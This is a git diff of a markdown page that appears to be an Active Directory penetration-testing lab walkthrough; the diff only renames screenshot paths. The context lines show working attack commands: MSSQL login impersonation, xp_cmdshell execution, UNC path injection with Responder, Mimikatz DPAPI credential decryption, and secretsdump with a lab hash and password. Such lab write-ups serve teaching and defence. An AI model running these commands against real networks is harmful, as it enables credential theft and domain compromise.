@@ -115,7 +115,7 @@ We didn't found anything, but it is always good to check this for every user and
 
 To check if a user can access any systems I prefer to use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). This tool can easily check if the user can authenticate to a list of targets using either the protocols smb, winrm, mssql or ldap. It also supports ssh. This is a snippet from the help function:
 
-![](<../../../.gitbook/assets/image (47).png>)
+![](<../../../.gitbook/assets/image (47) (1).png>)
 
 1. We can check if the user can access anything over SMB, which by default a normal domain user can authenticate over SMB. If the user is local admin (which is what we need to really do anything over SMB, it will show `Pwn3d!` in orange).
 
@@ -234,7 +234,7 @@ WHERE a.permission_name = 'IMPERSONATE'
 EXECUTE AS LOGIN = 'sa'
 ```
 
-![](<../../../.gitbook/assets/image (46) (1) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1) (1) (1).png>)
 
 6\. Lets try to impersonate `developer_test` and then check for sysadmin privileges and if impersonation is possible again:
 
@@ -292,7 +292,7 @@ Now we can try to execute the `whoami` command again and it worked:
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![](<../../../.gitbook/assets/image (63) (1).png>)
+![](<../../../.gitbook/assets/image (63) (1) (1).png>)
 
 3\. The next step is to gain a reverse shell from `WEB01`. For this we need to prepare some files and setup a listener before we execute a query and command on the sql server.&#x20;
 
@@ -545,7 +545,7 @@ SQL Servers by default runs as a local service under the context of the computer
 sudo responder -I tun0
 ```
 
-![](<../../../.gitbook/assets/image (69) (1).png>)
+![](<../../../.gitbook/assets/image (69) (1) (1).png>)
 
 2\. The next step is to perform a UNC Path injection attack. One SQL function we can use for that is `xp_dirtree`. We can try the UNC Path injection with the following query in HeidiSQL, using the EXEC AT method to execute something through the link:
 
@@ -633,7 +633,7 @@ $creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_s
 
 The credentials are saved in the `$creds` variable now:
 
-![](<../../../.gitbook/assets/image (46) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1) (1).png>)
 
 6\. Now we can use PowerView to query the domain controller from `secure.local` for the domain-object `DATA01` and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve as well;
 
@@ -860,7 +860,7 @@ If we now run the same Mimikatz.exe command we receive the masterkey:
 ./mimikatz.exe "dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD /masterkey:b3e8630e96acba990f836b4462a9285a4c987776f17f11b2559d9fdf67d03cf6b99dd89445d5641aef6f4477f7354eb6f19e3053e1d56712f45bc227249cdea2" "exit"
 ```
 
-![](<../../../.gitbook/assets/image (63).png>)
+![](<../../../.gitbook/assets/image (63) (1).png>)
 
 We recived a credentials for the `sa_backup` user, the password is `LS6RV5o8T9`. We can quickly check if this is correct with Crackmapexec:
 
@@ -868,7 +868,7 @@ We recived a credentials for the `sa_backup` user, the password is `LS6RV5o8T9`.
 crackmapexec smb 10.0.0.100 -u sa_backup -p LS6RV5o8T9
 ```
 
-![](<../../../.gitbook/assets/image (46).png>)
+![](<../../../.gitbook/assets/image (46) (1).png>)
 
 The login is succesfull, so the password is correct. The last thing to do is to remove the tools we placed on the machine and we should disable RDP again to not leave any changes to the system.
 
@@ -917,11 +917,11 @@ secretsdump.py LOCAL -system ~/adlab/share/SYSTEM -security ~/adlab/share/SECURI
 secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaad3b435b51404ee:ba6414d4e6ce546465b256950282c7f3
 ```
 
-![](<../../../.gitbook/assets/image (57).png>)
+![](<../../../.gitbook/assets/image (57) (1).png>)
 
 7\. We retrieved the Administrator hash and can authenticate as `Domain Admin` to the Domain Controller `DC03` of `Secure.local`.
 
-![](<../../../.gitbook/assets/image (69).png>)
+![](<../../../.gitbook/assets/image (69) (1).png>)
 
 ### 13. Kerberoast
 
